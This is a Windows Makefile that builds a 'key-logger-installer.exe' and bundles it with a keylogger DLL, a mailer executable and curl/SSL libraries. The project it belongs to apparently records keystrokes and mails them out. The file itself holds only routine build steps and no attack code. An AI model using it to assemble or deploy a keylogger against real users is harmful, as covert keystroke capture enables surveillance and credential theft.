#######################################################################################################
# Module history:                                                                                     #
#   Date:       Author:                    Reason:                                                    #
#   15.09.2023  Gaina Stefan               Initial version.                                           #
# Description: This Makefile is used to generate the keylogger installer executable.                  #
#######################################################################################################

CFLAGS  = -Wall -Werror

INCLUDES = -Iinclude/

SOURCES    := $(wildcard $(SRC)/*.c)
OBJECTS    := $(patsubst $(SRC)/%.c, $(OBJ)/%.o, $(SOURCES))
EXECUTABLE := key-logger-installer.exe

all: | create_dirs $(EXECUTABLE) copy_library

### CREATE DIRECTORIES ###
create_dirs:
	if not exist "$(OBJ)" mkdir $(OBJ)
	if not exist "$(BIN)" mkdir $(BIN)

### BINARIES ###
$(EXECUTABLE): $(OBJECTS)
	$(CC) $(CFLAGS) -o $(BIN)/$@ $^

### OBJECTS ###
$(OBJ)/%.o: $(SRC)/%.c
	$(CC) $(CFLAGS) $(INCLUDES) -c $< -o $@

### COPY EXECUTABLE ###
copy_library:
	copy ..\key-logger\$(LIB)\libkeylogger.dll         $(BIN)
	copy ..\key-logger-mail\$(BIN)\key-logger-mail.exe $(BIN)
	copy ..\vendor\curl\$(LIB)\libcurl.dll             $(BIN)
	copy ..\vendor\curl\$(LIB)\libssl-3-x64.dll        $(BIN)
	copy ..\vendor\curl\$(LIB)\libcrypto-3-x64.dll     $(BIN)

### CLEAN ###
clean:
	$(RM) $(OBJ)\*
	$(RM) $(BIN)\*
